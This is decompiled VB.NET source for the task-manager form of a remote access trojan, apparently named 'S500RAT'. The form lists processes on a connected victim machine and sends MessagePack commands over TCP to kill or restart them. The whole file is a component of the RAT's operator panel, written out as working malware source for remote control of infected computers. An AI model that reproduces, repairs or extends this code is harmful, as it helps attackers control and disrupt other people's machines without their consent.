Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000035 RID: 53
	<DesignerGenerated()>
	Public Partial Class FormTaskManager
		Inherits Form

		' Token: 0x06000F0C RID: 3852 RVA: 0x0008461B File Offset: 0x0008281B
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormTaskManager_Load
			AddHandler MyBase.Resize, AddressOf Me.FormTaskManager_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000624 RID: 1572
		' (get) Token: 0x06000F0F RID: 3855 RVA: 0x0008573E File Offset: 0x0008393E
		' (set) Token: 0x06000F10 RID: 3856 RVA: 0x00085748 File Offset: 0x00083948
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000625 RID: 1573
		' (get) Token: 0x06000F11 RID: 3857 RVA: 0x0008578B File Offset: 0x0008398B
		' (set) Token: 0x06000F12 RID: 3858 RVA: 0x00085795 File Offset: 0x00083995
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000626 RID: 1574
		' (get) Token: 0x06000F13 RID: 3859 RVA: 0x0008579E File Offset: 0x0008399E
		' (set) Token: 0x06000F14 RID: 3860 RVA: 0x000857A8 File Offset: 0x000839A8
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000627 RID: 1575
		' (get) Token: 0x06000F15 RID: 3861 RVA: 0x000857B1 File Offset: 0x000839B1
		' (set) Token: 0x06000F16 RID: 3862 RVA: 0x000857BB File Offset: 0x000839BB
		Friend Overridable Property ControllContextMenuStrip As ContextMenuStrip

		' Token: 0x17000628 RID: 1576
		' (get) Token: 0x06000F17 RID: 3863 RVA: 0x000857C4 File Offset: 0x000839C4
		' (set) Token: 0x06000F18 RID: 3864 RVA: 0x000857D0 File Offset: 0x000839D0
		Friend Overridable Property RefreshList As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshList
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshList_Click
				Dim refreshList As ToolStripMenuItem = Me._RefreshList
				If refreshList IsNot Nothing Then
					RemoveHandler refreshList.Click, value2
				End If
				Me._RefreshList = value
				refreshList = Me._RefreshList
				If refreshList IsNot Nothing Then
					AddHandler refreshList.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000629 RID: 1577
		' (get) Token: 0x06000F19 RID: 3865 RVA: 0x00085813 File Offset: 0x00083A13
		' (set) Token: 0x06000F1A RID: 3866 RVA: 0x00085820 File Offset: 0x00083A20
		Friend Overridable Property RestartProcess As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RestartProcess
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartProcess_Click
				Dim restartProcess As ToolStripMenuItem = Me._RestartProcess
				If restartProcess IsNot Nothing Then
					RemoveHandler restartProcess.Click, value2
				End If
				Me._RestartProcess = value
				restartProcess = Me._RestartProcess
				If restartProcess IsNot Nothing Then
					AddHandler restartProcess.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700062A RID: 1578
		' (get) Token: 0x06000F1B RID: 3867 RVA: 0x00085863 File Offset: 0x00083A63
		' (set) Token: 0x06000F1C RID: 3868 RVA: 0x00085870 File Offset: 0x00083A70
		Friend Overridable Property KillProcess As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._KillProcess
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillProcess_Click
				Dim killProcess As ToolStripMenuItem = Me._KillProcess
				If killProcess IsNot Nothing Then
					RemoveHandler killProcess.Click, value2
				End If
				Me._KillProcess = value
				killProcess = Me._KillProcess
				If killProcess IsNot Nothing Then
					AddHandler killProcess.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700062B RID: 1579
		' (get) Token: 0x06000F1D RID: 3869 RVA: 0x000858B3 File Offset: 0x00083AB3
		' (set) Token: 0x06000F1E RID: 3870 RVA: 0x000858BD File Offset: 0x00083ABD
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x1700062C RID: 1580
		' (get) Token: 0x06000F1F RID: 3871 RVA: 0x000858C6 File Offset: 0x00083AC6
		' (set) Token: 0x06000F20 RID: 3872 RVA: 0x000858D0 File Offset: 0x00083AD0
		Friend Overridable Property ListProcess As Guna2DataGridView

		' Token: 0x1700062D RID: 1581
		' (get) Token: 0x06000F21 RID: 3873 RVA: 0x000858D9 File Offset: 0x00083AD9
		' (set) Token: 0x06000F22 RID: 3874 RVA: 0x000858E3 File Offset: 0x00083AE3
		Public Overridable Property ProcessNum As Label

		' Token: 0x1700062E RID: 1582
		' (get) Token: 0x06000F23 RID: 3875 RVA: 0x000858EC File Offset: 0x00083AEC
		' (set) Token: 0x06000F24 RID: 3876 RVA: 0x000858F6 File Offset: 0x00083AF6
		Friend Overridable Property Column3 As DataGridViewImageColumn

		' Token: 0x1700062F RID: 1583
		' (get) Token: 0x06000F25 RID: 3877 RVA: 0x000858FF File Offset: 0x00083AFF
		' (set) Token: 0x06000F26 RID: 3878 RVA: 0x00085909 File Offset: 0x00083B09
		Friend Overridable Property Column4 As DataGridViewTextBoxColumn

		' Token: 0x17000630 RID: 1584
		' (get) Token: 0x06000F27 RID: 3879 RVA: 0x00085912 File Offset: 0x00083B12
		' (set) Token: 0x06000F28 RID: 3880 RVA: 0x0008591C File Offset: 0x00083B1C
		Friend Overridable Property Column5 As DataGridViewTextBoxColumn

		' Token: 0x17000631 RID: 1585
		' (get) Token: 0x06000F29 RID: 3881 RVA: 0x00085925 File Offset: 0x00083B25
		' (set) Token: 0x06000F2A RID: 3882 RVA: 0x0008592F File Offset: 0x00083B2F
		Friend Overridable Property Column6 As DataGridViewTextBoxColumn

		' Token: 0x17000632 RID: 1586
		' (get) Token: 0x06000F2B RID: 3883 RVA: 0x00085938 File Offset: 0x00083B38
		' (set) Token: 0x06000F2C RID: 3884 RVA: 0x00085942 File Offset: 0x00083B42
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000633 RID: 1587
		' (get) Token: 0x06000F2D RID: 3885 RVA: 0x0008594B File Offset: 0x00083B4B
		' (set) Token: 0x06000F2E RID: 3886 RVA: 0x00085955 File Offset: 0x00083B55
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x17000634 RID: 1588
		' (get) Token: 0x06000F2F RID: 3887 RVA: 0x0008595E File Offset: 0x00083B5E
		' (set) Token: 0x06000F30 RID: 3888 RVA: 0x00085968 File Offset: 0x00083B68
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000635 RID: 1589
		' (get) Token: 0x06000F31 RID: 3889 RVA: 0x000859AB File Offset: 0x00083BAB
		' (set) Token: 0x06000F32 RID: 3890 RVA: 0x000859B5 File Offset: 0x00083BB5
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000636 RID: 1590
		' (get) Token: 0x06000F33 RID: 3891 RVA: 0x000859BE File Offset: 0x00083BBE
		' (set) Token: 0x06000F34 RID: 3892 RVA: 0x000859C8 File Offset: 0x00083BC8
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000637 RID: 1591
		' (get) Token: 0x06000F35 RID: 3893 RVA: 0x000859D1 File Offset: 0x00083BD1
		' (set) Token: 0x06000F36 RID: 3894 RVA: 0x000859DB File Offset: 0x00083BDB
		Public Property Client As Clients

		' Token: 0x17000638 RID: 1592
		' (get) Token: 0x06000F37 RID: 3895 RVA: 0x000859E4 File Offset: 0x00083BE4
		' (set) Token: 0x06000F38 RID: 3896 RVA: 0x000859EE File Offset: 0x00083BEE
		Public Property F As FormS500

		' Token: 0x17000639 RID: 1593
		' (get) Token: 0x06000F39 RID: 3897 RVA: 0x000859F7 File Offset: 0x00083BF7
		' (set) Token: 0x06000F3A RID: 3898 RVA: 0x00085A01 File Offset: 0x00083C01
		Public Property FullPath As String

		' Token: 0x1700063A RID: 1594
		' (get) Token: 0x06000F3B RID: 3899 RVA: 0x00085A0A File Offset: 0x00083C0A
		' (set) Token: 0x06000F3C RID: 3900 RVA: 0x00085A14 File Offset: 0x00083C14
		Friend Property ParentClient As Clients

		' Token: 0x06000F3D RID: 3901 RVA: 0x00085A20 File Offset: 0x00083C20
		Private Sub FormTaskManager_Load(sender As Object, e As EventArgs)
			Me.ListProcess.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListProcess.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListProcess.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListProcess.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListProcess.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListProcess.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListProcess.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.ListProcess.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.ListProcess.CellBorderStyle = DataGridViewCellBorderStyle.None
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x06000F3E RID: 3902 RVA: 0x00085C14 File Offset: 0x00083E14
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x06000F3F RID: 3903 RVA: 0x00085C80 File Offset: 0x00083E80
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x06000F40 RID: 3904 RVA: 0x00085C98 File Offset: 0x00083E98
		Private Sub FormTaskManager_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06000F41 RID: 3905 RVA: 0x00085D2C File Offset: 0x00083F2C
		Private Sub RefreshList_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "FormTaskManager"
			msgPack.ForcePathObject("Option").AsString = "List"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Me.ListProcess.Enabled = False
		End Sub

		' Token: 0x06000F42 RID: 3906 RVA: 0x00085D98 File Offset: 0x00083F98
		Private Sub KillProcess_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListProcess.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListProcess.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "FormTaskManager"
						msgPack.ForcePathObject("Option").AsString = "Kill"
						msgPack.ForcePathObject("PID").AsString = dataGridViewRow.Cells(2).Value.ToString()
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06000F43 RID: 3907 RVA: 0x00085EA0 File Offset: 0x000840A0
		Private Sub RestartProcess_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListProcess.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListProcess.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "FormTaskManager"
						msgPack.ForcePathObject("Option").AsString = "Restart"
						msgPack.ForcePathObject("PID").AsString = dataGridViewRow.Cells(2).Value.ToString()
						msgPack.ForcePathObject("Path").AsString = dataGridViewRow.Cells(3).Value.ToString()
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x040006D8 RID: 1752
		Private FormSize As Boolean
	End Class
End Namespace
